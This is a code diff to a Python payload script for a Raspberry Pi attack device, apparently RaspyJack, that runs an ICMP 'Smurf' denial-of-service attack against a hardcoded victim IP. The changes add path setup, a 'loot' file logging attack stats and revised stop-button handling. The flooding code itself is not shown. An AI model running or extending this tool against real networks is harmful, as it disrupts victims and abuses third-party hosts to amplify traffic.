@@ -38,7 +38,13 @@ import signal
 import subprocess
 import threading
 from ipaddress import IPv4Address, IPv4Network
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+
+RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
+if RASPYJACK_ROOT not in sys.path:
+    sys.path.insert(0, RASPYJACK_ROOT)
+wifi_subdir = os.path.join(RASPYJACK_ROOT, 'wifi')
+if os.path.isdir(wifi_subdir) and wifi_subdir not in sys.path:
+    sys.path.insert(0, wifi_subdir)
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
@@ -47,6 +53,9 @@ from scapy.all import IP, ICMP, send, conf, get_if_addr, get_if_hwaddr, get_if_m
 conf.verb = 0
 
 VICTIM_IP = "192.168.1.100"
+
+LOOT_DIR = os.path.join(RASPYJACK_ROOT, 'loot', 'dos_smurf_attack')
+os.makedirs(LOOT_DIR, exist_ok=True)
 
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
@@ -73,11 +82,28 @@ def cleanup(*_):
         running = False
         attack_stop_event.set()
         if attack_thread and attack_thread.is_alive():
-            attack_thread.join(timeout=2) # Wait for the thread to finish
+            attack_thread.join(timeout=2)
+        save_loot_snapshot()
         print("Smurf Attack cleanup complete.", file=sys.stderr)
 
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
+
+def save_loot_snapshot():
+    """Save a loot snapshot with attack stats."""
+    try:
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        loot_file = os.path.join(LOOT_DIR, f"smurf_attack_{timestamp}.txt")
+        with open(loot_file, 'w') as f:
+            f.write(f"Smurf Attack\n")
+            f.write(f"Victim IP: {VICTIM_IP}\n")
+            f.write(f"Broadcast IP: {BROADCAST_IP}\n")
+            f.write(f"Interface: {ATTACK_INTERFACE}\n")
+            f.write(f"Packets Sent: {packet_count}\n")
+            f.write(f"Timestamp: {timestamp}\n")
+        print(f"Loot saved to {loot_file}")
+    except Exception as e:
+        print(f"Error saving loot: {e}", file=sys.stderr)
 
 def draw_ui(screen_state="main", status: str = "", message_lines=None):
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
@@ -289,7 +315,12 @@ if __name__ == "__main__":
             
             elif current_screen == "attacking":
                 draw_ui("attacking", "ACTIVE")
-                if (GPIO.input(PINS["KEY3"]) == 0 or GPIO.input(PINS["OK"]) == 0) and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
+                    stop_attack()
+                    cleanup()
+                    break
+                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                     last_button_press_time = current_time
                     stop_attack()
                     current_screen = "main"
